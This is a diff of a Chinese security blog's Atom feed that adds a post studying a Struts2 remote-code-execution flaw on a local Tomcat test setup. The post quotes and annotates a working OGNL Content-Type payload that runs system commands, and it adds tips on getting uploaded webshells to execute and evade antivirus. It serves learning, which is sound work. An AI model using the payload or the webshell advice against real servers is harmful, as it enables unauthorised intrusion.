@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://phantom0301.coding.me/"/>
-  <updated>2017-03-05T07:35:35.096Z</updated>
+  <updated>2017-03-21T07:50:21.049Z</updated>
   <id>http://phantom0301.coding.me/</id>
   
   <author>
@@ -14,6 +14,199 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Struts2-S054漏洞学习及其他</title>
+    <link href="http://phantom0301.coding.me/2017/03/13/struts2/"/>
+    <id>http://phantom0301.coding.me/2017/03/13/struts2/</id>
+    <published>2017-03-13T11:30:45.000Z</published>
+    <updated>2017-03-21T07:50:21.049Z</updated>
+    
+    <content type="html">&lt;p&gt;Struts2的环境有时候显得有些庞大而复杂，这里借着漏洞学习的过程了解一下Tomcat+Struts2架构的一些问题，这么一看重要的学习其他而不是漏洞了~~。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&quot;0x01-Java-Tomcat-Struts2&quot;&gt;&lt;a href=&quot;#0x01-Java-Tomcat-Struts2&quot; class=&quot;headerlink&quot; title=&quot;0x01 Java+Tomcat+Struts2&quot;&gt;&lt;/a&gt;0x01 Java+Tomcat+Struts2&lt;/h2&gt;&lt;p&gt;之前很少接触Java环境下的Web问题，对于Jboss，Tomcat，Struts2，Weblogic等等的概念没有一下清晰的认识，通过查阅资料，有了如下的认识。&lt;/p&gt;
+&lt;p&gt;首先这些应用都是为了完成一个Java的Web服务，那么，在拥有Java环境的情况下，我们需要一个能够监听Web服务并且调度相关逻辑的服务器，这个就是Tomcat起到的作用。&lt;/p&gt;
+&lt;p&gt;和Tomcat具有同样身份作用的还有Jboss，Resin，Glassfish和Weblogic，那么其实Struts2都可以部署在这些Java容器中，这里就以Tomcat为例，一个运行成功的Tomcat应用如下图所示。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170313200921.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;我们可以看一下默认的Tomcat目录&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;bin  # 启动/关闭服务的脚本
+ |-bootstrap.jar  # 引导程序
+ |-commons-daemon.jar  # 守护程序
+ |-tomcat-juli.jar  # java util logging 日志管理
+ |-daemon.sh
+ |-startup.sh
+ |-shutdown.sh
+ |-setclasspath.sh  # 动态设置JAVA变量,内部使用
+ |-digest.sh  #  使用特殊的算法加密
+ |-tool-wrapper.sh  # 封装工具，内部使用
+ |-version.sh  #  检测版本
+ |-configtest.sh  # 测试配置文件语法
+ |-catalina.sh  #  启动相应的java程序
+ |-catalina-tasks.xml  # 加载包路径
+conf
+ |-Catalina  # 默认似乎是空的，可以用来配置项目路径
+ |-catalina.properties  # catalina的安全设置、类加载设置、字符缓存设置
+ |-catalina.policy  # 安全策略
+ |-jaspic-providers.xml  # 身份验证模块配置
+ |-jaspic-providers.xsd  # 似乎xsd在这里是变量定义 
+ |-logging.properties  # 日志记录配置
+ |-tomcat-users.xml  
+ |-web.xml  # Web基础配置
+ |-context.xml  # 配置策略的路径
+ |-server.xml  # 服务端信息配置，端口，日志存储方式，根路径等等    
+lib
+ |-*.jar  # java封装库
+logs
+ |-*.log  # 日志存储文件
+temp
+webapps
+ |-*.war  # 打包的Web程序
+ |-*  # 自动解压的Web 页面程序
+work
+ |-*  # 对应webapps的类库
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;*安全策略，包括对于一些系统变量的读取限制，特殊的函数执行限制，文件的读写控制&lt;/p&gt;
+&lt;p&gt;下图是一张Tomcat的层级关系&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170313211929.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;简单认识了一下Tomcat的结构后，我们来部署一个含有S054漏洞的struts2应用，下载struts2后，拷贝apps中的structs2-blank.war到Tomcat的webapps目录下，重启Tomcat，就会自动解压war包。&lt;/p&gt;
+&lt;p&gt;访问 &lt;a href=&quot;http://127.0.0.1:8080/struts2-blank/example/HelloWorld.action&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://127.0.0.1:8080/struts2-blank/example/HelloWorld.action&lt;/a&gt;&lt;br&gt;就可以访问到一个struts自带的欢迎界面&lt;/p&gt;
+&lt;p&gt;我们尝试修改解压出来的应用文件夹名为ROOT，发现在没有任何配置的情况下，tomcat会默认访问ROOT文件夹，而其他文件夹可以通过路由访问，当然前提是策略允许访问，&lt;/p&gt;
+&lt;p&gt;同时，我在之前提到了路径还可以配置在conf中，我们尝试创建一个指定根路径为structs2-blank的配置文件于conf/Catalina/localhost中也可以实现当Web文件不在webapps中时的路由访问。&lt;/p&gt;
+&lt;p&gt;再来看一下struts默认的目录结构&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;docs  # 文档
+apps  # struts2的war包，提供样例参考
+ |-blank
+ |-mailreader
+ |-portlet
+ |-rest-showcase
+ |-showcase
+lib  # jar包库
+src  # struts2的源码
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们使用blank来做测试用，blank基本展示了struts2应用应该有的几部分：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;WEB-INF
+|-web.xml  # 过滤器配置文件以及基础路径配置
+|-src  # 源码
+|-lib  # jar库
+|-jsp  # jsp文件夹
+|-classes  # 类和其他配置文件文件夹
+META-INF  # 元信息
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;0x02-漏洞测试&quot;&gt;&lt;a href=&quot;#0x02-漏洞测试&quot; class=&quot;headerlink&quot; title=&quot;0x02 漏洞测试&quot;&gt;&lt;/a&gt;0x02 漏洞测试&lt;/h2&gt;&lt;p&gt;这里就直接使用struts2自带的欢迎页面来测试：&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://127.0.0.1:8080/struts2-blank/example/HelloWorld.action&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://127.0.0.1:8080/struts2-blank/example/HelloWorld.action&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;先利用网上流传的工具来进行测试：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170314140943.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;确实存在漏洞，这个时候我们抓包进行细节的复现。在GET包中增加Content-Type字段，使用网上流传的Payload：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;%{
+(#nike=&amp;apos;multipart/form-data&amp;apos;).
+(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
+(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&amp;apos;com.opensymphony.xwork2.ActionContext.container&amp;apos;]).
+(#ognlUtil=#container.getInstance
+(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
+(#ognlUtil.getExcludedPackageNames().clear()).
+(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess
+(#dm)))).(#cmd=&amp;apos;whoami&amp;apos;).(#iswin=(@java.lang.System@getProperty
+(&amp;apos;os.name&amp;apos;).toLowerCase().contains(&amp;apos;win&amp;apos;))).(#cmds=(#iswin?
+{&amp;apos;cmd.exe&amp;apos;,&amp;apos;/c&amp;apos;,#cmd}:{&amp;apos;/bin/bash&amp;apos;,&amp;apos;-c&amp;apos;,#cmd})).(#p=new 
+java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).
+(#process=#p.start()).(#ros=
+(@org.apache.struts2.ServletActionContext@getResponse
+().getOutputStream())).(@org.apache.commons.io.IOUtils@copy
+(#process.getInputStream(),#ros)).(#ros.flush())
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;对上面一段payload进行格式整理&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;%{
+    (#nike=&amp;apos;multipart/form-data&amp;apos;).  访问非根对象nike
+    (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).  调用静态方法
+    (
+    #_memberAccess?
+        (#_memberAccess=#dm):
+        (
+            (#container=#context[&amp;apos;com.opensymphony.xwork2.ActionContext.container&amp;apos;]).
+            (
+                #ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)  创建类实例
+            ).
+            (#ognlUtil.getExcludedPackageNames().clear()).
+            (#ognlUtil.getExcludedClasses().clear()).
+            (
+            #context.setMemberAccess(#dm)
+            )
+        )
+    ).
+    (#cmd=&amp;apos;whoami&amp;apos;).
+    (
+        #iswin=(@java.lang.System@getProperty(&amp;apos;os.name&amp;apos;).toLowerCase().contains(&amp;apos;win&amp;apos;))
+    ).
+    (
+    #cmds=(#iswin?{&amp;apos;cmd.exe&amp;apos;,&amp;apos;/c&amp;apos;,#cmd}:{&amp;apos;/bin/bash&amp;apos;,&amp;apos;-c&amp;apos;,#cmd})
+    ).
+    (
+    #p=new java.lang.ProcessBuilder(#cmds)
+    ).
+    (#p.redirectErrorStream(true)).
+    (#process=#p.start()).
+    (
+    #ros=
+        (
+        @org.apache.struts2.ServletActionContext@getResponse().getOutputStream()
+        )
+    ).
+    (
+    @org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)
+    ).
+    (#ros.flush())
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;根据大牛们的解读文章，可以了解到&lt;/p&gt;
+&lt;p&gt;首先是&lt;em&gt;multipart/form-data&lt;/em&gt;绕过类型判断，然后调用了&lt;em&gt;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS&lt;/em&gt;这个方法给了&lt;em&gt;#_memberAccess&lt;/em&gt;这个节点，然后就是利用&lt;em&gt;java.lang.ProcessBuilder&lt;/em&gt;执行预定的cmd命令，对执行后的错误流进行重定向显示。~~当然这只能算是对于这段payload的主观感觉猜测。&lt;/p&gt;
+&lt;p&gt;详细的底层分析可以阅读这篇文章&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://paper.seebug.org/247/&quot; title=&quot;http://paper.seebug.org/247/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://paper.seebug.org/247/&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&quot;0x03-JSP解析的问题&quot;&gt;&lt;a href=&quot;#0x03-JSP解析的问题&quot; class=&quot;headerlink&quot; title=&quot;0x03 JSP解析的问题&quot;&gt;&lt;/a&gt;0x03 JSP解析的问题&lt;/h2&gt;&lt;p&gt;有朋友在测试时发现，在有漏洞的站点执行命令是很容易的，反弹Shell也可以轻松完成，但上传Webshell就不见得每次都能够顺利完成，而很多时候如果能使用Webshell进行图形界面操作会更加方便。这里就常见的几种上传失败情况进行总结。&lt;/p&gt;
+&lt;p&gt;1.上传成功但解析跳转：&lt;/p&gt;
+&lt;p&gt;这种情况对应到之前说到的路由关系，我们仍然使用struts2-blank来测试。&lt;/p&gt;
+&lt;p&gt;blank默认情况下，有策略限制直接跳转到jsp。&lt;/p&gt;
+&lt;p&gt;访问URL：struts2-blank/WEB-INF/jsp/example/Login.jsp，页面会显示403。&lt;br&gt;这个时候发现访问Login.action可以访问成功。此时，如果在当前文件夹下上传test.jsp，必须使用test或者test.action来访问。&lt;/p&gt;
+&lt;p&gt;值得一提的是，这种对攻击者上传文件的成功访问是基于以下这条规则：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;action name=&amp;quot;*&amp;quot; class=&amp;quot;example.ExampleSupport&amp;quot;&amp;gt;
+    &amp;lt;result&amp;gt;/WEB-INF/jsp/example/{1}.jsp&amp;lt;/result&amp;gt;
+&amp;lt;/action&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;简单解释一下，class相当于处理逻辑（Model？），然后对action 的name进行全匹配，将匹配到的文件名进行相应的jsp（View？）跳转。&lt;/p&gt;
+&lt;p&gt;而之所以test和test.action都可以被访问到应该是一种缺省规则，在struts.xml中添加如下规则：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;constant name=&amp;quot;struts.action.extension&amp;quot; value=&amp;quot;action&amp;quot;&amp;gt;&amp;lt;/constant&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;此时，test就无法被访问到。&lt;/p&gt;
+&lt;p&gt;从上面这种情况来看，跳转的原因首先是对接收的后缀进行匹配，其次是相关action动作的处理，那么我们就可以通过添加和上面相似的规则来实现Webshell的访问。&lt;/p&gt;
+&lt;p&gt;这里就不得不提一下struts的运行机制&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;struts.xml,这个按照我的理解就相当于是一个控制器，进行路由控制
+    |
+    |
+   \ /
+  class，当路由得到相应的action名后，以相应的method来调用class处理逻辑
+    |
+    |
+   \ /
+   jsp,根据处理逻辑的不同，跳转给用户相应的显示页面
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里从我理解的MVC的角度进行解释，根据我查阅的资料，再往下走应该是struts2的filter机制，这里我就先不去理解了。&lt;/p&gt;
+&lt;p&gt;2.上传成功，解析出错&lt;/p&gt;
+&lt;p&gt;这种情况主要分为两种，一种是解析错但菜刀依然可以执行，另一种是类文件或者库文件缺失，个人猜测通过上传相应的文件到lib或者classes文件夹来进行尝试，但因为缺乏相应的测试条件，这个问题先留在这里，后面实践了再来补写。&lt;/p&gt;
+&lt;p&gt;3.无法上传&lt;/p&gt;
+&lt;p&gt;根据朋友讲的他遇到的经历，无法上传主要有以下几种情况：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;有防护软件进行文件查杀，这种可以通过一些特殊的Shell来绕过&lt;/li&gt;
+&lt;li&gt;长度限制，这种存在于一些服务器对于请求包有所限制，导致过长的shell无法成功上传。&lt;/li&gt;
+&lt;li&gt;在手动写文件时，还有些服务器禁用echo等写文件命令也会导致文件出错&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;0x04-其他&quot;&gt;&lt;a href=&quot;#0x04-其他&quot; class=&quot;headerlink&quot; title=&quot;0x04 其他&quot;&gt;&lt;/a&gt;0x04 其他&lt;/h2&gt;&lt;p&gt;在实际测试中发现，许多struts2的应用广泛使用了许多其他中间件，比如Hiberate、HyperSQL等等平时没有使用到的框架或者数据库，还有会使用其他Web服务器的情况，比如JBoss。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Struts2的环境有时候显得有些庞大而复杂，这里借着漏洞学习的过程了解一下Tomcat+Struts2架构的一些问题，这么一看重要的学习其他而不是漏洞了~~。&lt;br&gt;
+    
+    </summary>
+    
+      <category term="JAVA" scheme="http://phantom0301.coding.me/categories/JAVA/"/>
+    
+    
+      <category term="struts2" scheme="http://phantom0301.coding.me/tags/struts2/"/>
+    
+      <category term="漏洞学习" scheme="http://phantom0301.coding.me/tags/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
+    
+  </entry>
   
   <entry>
     <title>英文文献阅读-使用遗传算法的异常入侵检测</title>
@@ -1218,7 +1411,7 @@ docker run -d 镜像名或id
 &lt;p&gt;先入门基本指令，我以我的wordpress为例：&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;FROM ubuntu:14.04&lt;/p&gt;
-&lt;p&gt;MAINTAINER xxxx &lt;a href=&quot;&amp;#109;&amp;#x61;&amp;#105;&amp;#x6c;&amp;#116;&amp;#111;&amp;#x3a;&amp;#x78;&amp;#120;&amp;#x78;&amp;#x78;&amp;#64;&amp;#120;&amp;#x78;&amp;#120;&amp;#x78;&quot;&gt;&amp;#x78;&amp;#120;&amp;#x78;&amp;#x78;&amp;#64;&amp;#120;&amp;#x78;&amp;#120;&amp;#x78;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;MAINTAINER xxxx &lt;a href=&quot;&amp;#x6d;&amp;#x61;&amp;#x69;&amp;#x6c;&amp;#116;&amp;#x6f;&amp;#x3a;&amp;#x78;&amp;#120;&amp;#120;&amp;#120;&amp;#64;&amp;#120;&amp;#x78;&amp;#120;&amp;#120;&quot;&gt;&amp;#x78;&amp;#120;&amp;#120;&amp;#120;&amp;#64;&amp;#120;&amp;#x78;&amp;#120;&amp;#120;&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;ENV DEBIAN_FRONTEND noninteractive&lt;/p&gt;
 &lt;p&gt;RUN apt-get update&lt;/p&gt;
 &lt;p&gt;RUN apt-get -y upgrade&lt;/p&gt;
@@ -1504,39 +1697,6 @@ if __name__ == &amp;quot;__main__&amp;quot;:
       <category term="Python" scheme="http://phantom0301.coding.me/tags/Python/"/>
     
       <category term="Socket" scheme="http://phantom0301.coding.me/tags/Socket/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>效率利器-Synergy</title>
-    <link href="http://phantom0301.coding.me/2016/04/06/Synergy/"/>
-    <id>http://phantom0301.coding.me/2016/04/06/Synergy/</id>
-    <published>2016-04-06T06:52:16.000Z</published>
-    <updated>2016-08-04T07:59:46.859Z</updated>
-    
-    <content type="html">&lt;p&gt;最近要同时操作两台机器，一台是win的，一台是linux的。无论是准备两套键鼠，还是用SSH远程都不够方便。&lt;/p&gt;
-&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
-&lt;p&gt;在网上找到了这个软件&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/sy1.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-&lt;p&gt;发现很好的解决了我的需求，而且它不仅可以让两个系统的主机共用一套键鼠，还可以实现两台主机上的简单分屏，虽然不能直接从一个屏幕拖到另一个屏幕，但是鼠标可以无缝连接滑动，而且共享剪贴板。&lt;/p&gt;
-&lt;p&gt;设置也很简单&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/sy2.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-&lt;p&gt;在两台电脑上分别安装Synergy，并且在同一个局域网中。一台作为server主机（键鼠物理连接的电脑），一台作为client从机。&lt;/p&gt;
-&lt;p&gt;在主机上进行配置，&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/sy3.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-&lt;p&gt;在这里选择分屏的位置。&lt;/p&gt;
-&lt;p&gt;再在 Advanced server settings设置主从机切换的快捷键&lt;/p&gt;
-&lt;p&gt;分别启动，软件就会自动去检测主从机。&lt;/p&gt;
-</content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;最近要同时操作两台机器，一台是win的，一台是linux的。无论是准备两套键鼠，还是用SSH远程都不够方便。&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="工具" scheme="http://phantom0301.coding.me/tags/%E5%B7%A5%E5%85%B7/"/>
     
   </entry>
   
